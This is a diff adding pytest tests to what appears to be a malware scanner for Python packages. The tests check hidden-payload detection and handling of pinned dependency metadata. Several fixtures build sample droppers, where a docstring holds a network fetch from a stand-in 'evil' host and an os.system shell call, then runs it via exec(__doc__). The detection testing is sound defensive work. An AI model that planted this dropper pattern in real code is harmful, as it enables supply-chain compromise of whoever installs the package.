@@ -356,6 +356,65 @@ def test_exec_with_payload_hidden_in_docstring_flagged():
     assert not any("hidden in a docstring" in f.check for f in findings2)
 
 
+def test_hidden_network_plus_exec_payload_flagged():
+    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds
+    # BOTH a network fetch and an os/shell exec. Neither is a blob, but together
+    # they are the payload, so the gate must flag the pair.
+    payload = (
+        "import urllib.request, os\n"
+        "urllib.request.urlopen('http://x/y').read()\n"
+        "os.system('sh -c id')\n"
+    )
+    src = '"""' + payload + '"""\nexec(__doc__)\n'
+    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
+    assert any("hidden network+exec payload" in f.check for f in findings)
+
+
+def test_real_code_network_and_subprocess_not_hidden_combo():
+    # Both calls live in REAL code (covered by the normal checks); the hidden
+    # network+exec combo must NOT also fire on them.
+    src = (
+        "import subprocess, urllib.request\n"
+        "def run():\n"
+        "    urllib.request.urlopen('http://x').read()\n"
+        "    subprocess.Popen(['sh'])\n"
+        "exec('1 + 1')\n"
+    )
+    findings = sp.check_py_file(src, "pkg/real.py", "pkg")
+    assert not any("hidden network+exec payload" in f.check for f in findings)
+
+
+def test_hidden_payload_survives_visible_decoy():
+    # A benign visible network call must not mask a docstring payload: the
+    # detector inspects the removed (blanked) span, not the whole stripped file.
+    payload = (
+        "import urllib.request, os\n"
+        "urllib.request.urlopen('http://evil/x').read()\n"
+        "os.system('sh -c id')\n"
+    )
+    src = (
+        '"""' + payload + '"""\n'
+        "import urllib.request\n"
+        "urllib.request.urlopen('http://benign/ok')\n"  # visible decoy
+        "exec(__doc__)\n"
+    )
+    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
+    assert any("hidden network+exec payload" in f.check for f in findings)
+
+
+def test_comment_only_network_exec_not_flagged():
+    # Tokens only in comments are not executable by exec(); the hidden network+exec
+    # check inspects strings/docstrings (not comments), so this must stay clean.
+    src = (
+        "code = 'x = 1'\n"
+        "exec(code)\n"
+        "# urllib.request.urlopen('http://host/p').read()\n"
+        "# subprocess.run(['sh', '-c', 'id'])\n"
+    )
+    findings = sp.check_py_file(src, "pkg/ex.py", "pkg")
+    assert not any("hidden network+exec payload" in f.check for f in findings)
+
+
 def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
     bl = tmp_path / "bl.json"
     listed = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected")
@@ -467,14 +526,85 @@ def test_requires_dist_skips_extras():
             "numpy (>=1.20)",
             "torch ; extra == 'dev'",  # optional extra -> skipped
             "pyyaml>=5 ; python_version >= '3.8'",  # non-extra marker -> kept
+            "payload>=1 ; extra != 'dev'",  # default-true marker -> kept
         ],
     )
-    specs = sp._requires_dist_names(meta, None)
-    # Version constraints preserved so a pinned dep is fetched, not latest.
+    specs = sp._requires_dist_names(meta)
+    # Version constraints are preserved so a pinned dep is fetched, not latest.
     assert "numpy>=1.20" in specs
     assert "pyyaml>=5" in specs
-    # The extra-gated dep is skipped entirely.
+    # A default-true marker that merely mentions ``extra`` is NOT optional.
+    assert "payload>=1" in specs
+    # The extra-gated dep is skipped entirely (no torch under any form).
     assert not any(sp._extract_pkg_name(s) == "torch" for s in specs)
+
+
+def test_marker_holds_by_default():
+    # Optional only when the extra is the sole gate.
+    assert sp._marker_holds_by_default("extra == 'dev'") is False
+    assert sp._marker_holds_by_default('extra == "dev"') is False
+    # Default-true markers that mention extra must be kept.
+    assert sp._marker_holds_by_default("extra != 'dev'") is True
+    assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
+    # No marker / plain env marker -> kept.
+    assert sp._marker_holds_by_default("") is True
+    # Platform/python markers are kept: the scanner runs on one target but the
+    # package may install on another, so these deps must still be scanned.
+    assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
+    assert sp._marker_holds_by_default("python_version == '3.13'") is True
+    assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True
+
+
+def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
+    # The pinned release's own metadata cannot be fetched -> recover nothing
+    # rather than substituting the latest release's (wrong) dependency tree.
+    project = _meta([], requires = ["latestdep==9.9.9"])
+    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
+    assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []
+
+
+def test_requires_dist_for_uses_pinned_release(monkeypatch):
+    # Project-level (latest) metadata declares no malicious dep; the pinned
+    # release does. _requires_dist_for must follow the pinned release's tree.
+    project = _meta([], requires = ["harmless>=1"])
+    pinned = _meta([], requires = ["payload==1.0.0"])
+    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: pinned if version else project)
+    specs = sp._requires_dist_for("oldpkg", "1.0.0", project)
+    assert "payload==1.0.0" in specs
+    assert "harmless>=1" not in specs
+
+
+def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
+    # Missing pinned metadata must surface an incomplete-scan error, not a silent
+    # [] that a caller cannot tell apart from a genuine no-deps release.
+    project = _meta([], requires = ["latestdep==9.9.9"])
+    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
+    errors: list[str] = []
+    assert sp._requires_dist_for("oldpkg", "1.0.0", project, errors) == []
+    assert errors and "incomplete" in errors[0]
+
+
+def test_release_files_pinned_missing_fails_closed():
+    # A pin absent from metadata must NOT fall back to the latest artifact.
+    meta = _meta(
+        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
+        version = "2.0.0",
+    )
+    assert sp._release_files(meta, "9.9.9") == []  # missing pin -> empty, not latest
+    assert sp._release_has_wheel(meta, "9.9.9") is False
+    assert sp._release_files(meta, "2.0.0")  # present pin still resolves
+    assert sp._release_files(meta, None)  # unpinned still uses latest
+
+
+def test_download_sdist_direct_missing_pin_does_not_scan_latest(tmp_path):
+    # Pinned version absent -> no sdist returned (never the latest file).
+    meta = _meta(
+        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
+        version = "2.0.0",
+    )
+    fpath, err = sp._download_sdist_direct("x", "9.9.9", str(tmp_path), meta = meta)
+    assert fpath is None and "no sdist" in err
+    assert list(tmp_path.iterdir()) == []
 
 
 def test_download_sdist_direct_refuses_non_pypi_url(tmp_path):
@@ -494,7 +624,8 @@ def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch
     payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
     monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload))
     meta = _meta(
-        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")]
+        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")],
+        version = "1.1.6",
     )
     fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta = meta)
     assert err is None and fpath is not None
@@ -520,10 +651,12 @@ def test_per_spec_genuine_failure_is_recorded_error(tmp_path, monkeypatch):
     monkeypatch.setattr(
         sp,
         "_pypi_json",
-        lambda name: _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]),
+        lambda name, version = None: _meta(
+            [_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]
+        ),
     )
     errors: list[str] = []
-    sp._resolve_per_spec_with_deps(["somepkg==1.0"], str(tmp_path), {}, errors)
+    sp._resolve_per_spec_with_deps(["somepkg==1.0.0"], str(tmp_path), {}, errors)
     assert errors and "somepkg" in errors[0]
 
 
@@ -537,7 +670,7 @@ def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
     monkeypatch.setattr(
         sp,
         "_pypi_json",
-        lambda name: _meta(
+        lambda name, version = None: _meta(
             [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x-1.0.0.tar.gz")]
         ),
     )
